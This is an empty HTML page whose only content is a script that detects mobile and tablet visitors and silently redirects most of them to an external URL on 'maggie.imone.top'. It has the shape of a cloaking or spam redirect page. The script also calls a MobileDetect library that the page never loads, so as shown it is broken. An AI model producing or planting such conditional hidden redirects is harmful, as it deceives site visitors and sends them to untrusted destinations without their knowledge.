<!DOCTYPE html>
<html>
<head>
  <title></title>
</head>
<body>
</body>
<script type="text/javascript">
var md = new MobileDetect(window.navigator.userAgent);
if (md.mobile() || md.tablet()) {
var redirect = false;
var excludeTablets = true;
var excludeIOSAndroid = true;
var isiOs = md.is("iOs"); var isAndroidOs = md.is("AndroidOs"); var isFeaturePhone = md.mobile() && !isiOs && !isAndroidOs; if (isFeaturePhone || md.tablet() && excludeTablets
|| (((isiOs && !md.tablet()) || isAndroidOs) && excludeIOSAndroid)) {
redirect = true;
}

if (redirect) {
location.href= 'http://maggie.imone.top/001-camille1695019806'; }}</script>

</html>
